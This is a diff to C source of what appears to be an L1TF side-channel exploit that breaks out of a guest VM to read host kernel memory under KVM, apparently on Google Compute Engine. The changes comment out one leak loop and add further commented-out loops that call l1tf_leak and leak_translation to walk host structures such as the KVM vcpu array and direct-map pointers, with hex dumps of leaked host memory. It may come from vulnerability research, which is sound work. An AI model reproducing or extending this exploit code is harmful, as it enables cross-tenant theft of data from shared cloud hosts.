@@ -1218,14 +1218,14 @@ void reverse_host_kernel_data_structures(void)
 	hpa_t kvm_pa = 0x13354d000; // leak_translation(base, kvm, hcr3, 0);
 	dump(kvm_pa);
 
-	char kvm_mid[0x250];
-	hpa_t kvm_start = kvm_pa + H_KVM_VCPU_ARRAY - sizeof(kvm_mid)/2;
-	for (int i = 0; i < 100; i++) {
-		printf("kvm_start, i.e. %lx: (i = %d)\n", kvm_start, i);
-		l1tf_leak(kvm_mid, base, kvm_start, sizeof(kvm_mid));
-		display(kvm_mid, sizeof(kvm_mid));
-	}
-	printf("\n");
+	// char kvm_mid[0x250];
+	// hpa_t kvm_start = kvm_pa + KVM_VCPU_ARRAY - sizeof(kvm_mid)/2;
+	// for (int i = 0; i < 100; i++) {
+	// 	printf("kvm_start, i.e. %lx: (i = %d)\n", kvm_start, i);
+	// 	l1tf_leak(kvm_mid, base, kvm_start, sizeof(kvm_mid));
+	// 	display(kvm_mid, sizeof(kvm_mid));
+	// }
+	// printf("\n");
 	// kvm_start, i.e. 13354e108: (i = 5)
 	//    0:                 0   00 00 00 00 00 00 00 00 ........
 	//    8:                 0   00 00 00 00 00 00 00 00 ........
@@ -1247,6 +1247,76 @@ void reverse_host_kernel_data_structures(void)
 	// }
 	// printf("\n");
 
+	// hpa_t chase = 0xffff93417354e0c0 - direct_map;
+	// dump(chase);
+	// char chase_buf[0x18];
+	// for (int i = 0; i < 100; i++) {
+	// 	printf("chase, i.e. %lx: (i = %d)\n", chase, i);
+	// 	l1tf_leak(chase_buf, base, chase, sizeof(chase_buf));
+	// 	display(chase_buf, sizeof(chase_buf));
+	// }
+	// printf("\n");
+
+	// char buf[3];
+	// l1tf_leak(buf, base, kvm_pa + 0x1130, 1000);
+	// display(buf, 3);
+
+	// hpa_t dm_ptr = l1tf_find_magic16(base, 0xffff, kvm_pa+0x1100+6, kvm_pa+0x1100+0x100, 8);
+	// dump(dm_ptr);
+	// dump(leak_u64(base, dm_ptr, 5));
+
+	// while (1) {
+	// 	dm_ptr = l1tf_find_magic16(base, 0xff93, dm_ptr, kvm_pa+0x100, 8);
+	// 	dump(dm_ptr);
+	// 	dump(leak_u64(base, dm_ptr, 5));
+	// }
+
+	// hpa_t kvm_np_pa = leak_translation(base, kvm+0x1000, hcr3, 0);
+	// dump(kvm_np_pa);
+	// char buf[0x40];
+	// while (1) {
+	// 	for (int off = 0; off < 0x300; off += sizeof(buf)) {
+	// 		for (int i = 0; i < 15; i++)
+	// 			l1tf_leak(buf, base, kvm_np_pa+off, sizeof(buf));
+	// 		printf("kvm_np_pa + %4x  i.e.  %16lx:\n", off, kvm_np_pa+off);
+	// 		display(buf, sizeof(buf));
+	// 	}
+	// }
+	// kvm_np_pa +  100  i.e.         124a5c100:
+	//    0:                 0   00 00 00 00 00 00 00 00 ........
+	//    8:                 0   00 00 00 00 00 00 00 00 ........
+	//   10:                 1   01 00 00 00 00 00 00 00 ........
+	//   18:  ffff9584f2d71058   58 10 d7 f2 84 95 ff ff X.......
+	//   20:  ffff9584f2d71ce8   e8 1c d7 f2 84 95 ff ff ........
+	//   28:  ffff9352eff70e40   40 0e f7 ef 52 93 ff ff @...R...
+	//   30:  ffff934153430e80   80 0e 43 53 41 93 ff ff ..CSA...
+	//   38:                 0   00 00 00 00 00 00 00 00 ........
+
+	// // This code was meant to chase down the XARRAY structure, but it turns
+	// // out (it seems) that on GCE the vcpus are just in a normal array, so no
+	// // need for the below:
+	// hpa_t kvm_next[2] = {0xffff9352eff70e40 - direct_map, 0xffff934153430e80 - direct_map};
+	// char buf[0x40];
+	// while (1) {
+	// 	for (int k = 0; k < 2; k++) {
+	// 		for (int i = 0; i < 10; i++)
+	// 			l1tf_leak(buf, base, kvm_next[k], sizeof(buf));
+	// 		printf("kvm_next[%d]  i.e.  %16lx:\n", k, kvm_next[k]);
+	// 		display(buf, sizeof(buf));
+	// 		for (int j = 0; j < 0x40; j += 8) {
+	// 			u64 *p = (u64 *)&buf[j];
+	// 			if (((*p) >> 40) == (direct_map >> 40)) {
+	// 				printf("*p = %lx\n", *p);
+	// 				hpa_t pa = *p - direct_map;
+	// 				dump(pa);
+	// 				char buf2[0x40];
+	// 				for (int i = 0; i < 10; i++)
+	// 					l1tf_leak(buf2, base, pa, sizeof(buf2));
+	// 				display(buf2, 0x40);
+	// 			}
+	// 		}
+	// 	}
+	// }
 
 	printf("hcr3 = %lx, cr3 = %lx, hpa = %lx\n", hcr3, cr3, hpa);
 
